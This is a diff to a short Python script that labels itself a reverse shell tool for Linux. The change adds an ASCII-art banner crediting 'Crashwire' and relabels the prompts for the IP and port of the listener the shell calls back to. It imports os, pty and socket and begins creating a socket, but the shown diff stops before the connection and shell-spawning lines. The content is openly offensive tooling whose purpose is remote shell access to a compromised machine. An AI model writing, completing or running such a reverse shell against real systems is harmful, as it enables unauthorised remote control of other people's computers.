@@ -1,12 +1,22 @@
 #!/usr/bin/python3
-#Simple python reverse shell for Linux. Set up a netcat listener, change the IP:Port and run
+#Simple python reverse shell. Set up a netcat listener to recieve connection
 import os
 import pty
 import socket
 import sys
 
-target_ip = input("Please input the attacker IP: ")
-target_port = input("Please input the attacker Port: ")
+#Banner
+print("*" * 30)
+print("           .-.")
+print("          (0.0)")
+print("        '=.|m|.='")
+print("        .='`\"``=.")
+print("    REVERSE SHELL TOOL")
+print("    Author: Crashwire")
+print("*" * 30)
+
+target_ip = input("\nPlease input the target IP: ")
+target_port = input("Please input the target Port: ")
 
 #Create and connect to socket
 s = socket.socket()
